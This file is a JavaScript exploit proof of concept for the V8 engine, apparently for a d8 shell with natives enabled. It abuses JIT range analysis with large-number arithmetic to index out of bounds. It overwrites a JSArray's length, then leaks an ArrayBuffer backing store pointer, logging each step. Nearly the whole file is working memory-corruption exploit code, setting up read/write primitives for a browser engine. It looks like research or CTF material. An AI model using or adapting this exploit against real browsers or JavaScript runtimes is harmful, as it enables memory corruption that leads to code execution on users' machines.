let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => {
  fv[0] = f;
  return dv[0];
}

let i2f = (i) => {
  dv[0] = BigInt(i);
  return fv[0];
}

let hexprintablei = (i) => {
  return (i).toString(16).padStart(16,"0");
}

let assert = (l,r,m) => {
  if (l != r) {
    log(hexprintablei(l) + " != " +  hexprintablei(r));
    log(m);
    throw "failed assert";
  }
  return true;
}

let log = this.print;

let error_unexpected_memory_layout_fixedarray_length_corruption = "unexpected memory layout for FixedArray length corruption";

let NEW_LENGTHSMI = 0x64;
let NEW_LENGTH64  = 0x0000006400000000;
let AB_LENGTH = 0x100;

let opt_me = (x) => {
  let MAGIC = 1.1; // don't move out of scope
  let arr = new Array(MAGIC,MAGIC,MAGIC);
  arr2 = Array.of(1.2); // allows to put the JSArray *before* the fixed arrays
  ab = new ArrayBuffer(AB_LENGTH);
  packed_elements_array = new Array(1.1,Math.random,1.2);
  let y = (x == "foo") ? 4503599627370495 : 4503599627370493;
  let z = 2 + y + y ; // 2 + 4503599627370495 * 2 = 9007199254740992
  z = z + 1 + 1 + 1;
  z = z - (4503599627370495*2); 
  let leak = arr[z];
  arr[z] = i2f(NEW_LENGTH64);
  if (leak != MAGIC) {
    assert(f2i(leak), 0x0000000100000000, error_unexpected_memory_layout_fixedarray_length_corruption);
    assert(arr2.length, NEW_LENGTHSMI);
    %DumpObjects(arr2,10|3);
    log("[+] corrupted JSArray's length");
    let ab_len_idx = arr2.indexOf(i2f(AB_LENGTH));
    assert(Number(f2i(arr2[ab_len_idx + 1])) & 1, false);
    assert(Number(f2i(arr2[ab_len_idx + 1])) > 0x10000, true);
    assert(f2i(arr2[ab_len_idx + 2]), 2);
    let ibackingstore_ptr = f2i(arr2[ab_len_idx + 1]);
    log("[+] Found backingstore pointer : " + hexprintablei(ibackingstore_ptr));
  }
  return leak;
}

opt_me("");
%OptimizeFunctionOnNextCall(opt_me);
let res = opt_me("foo");
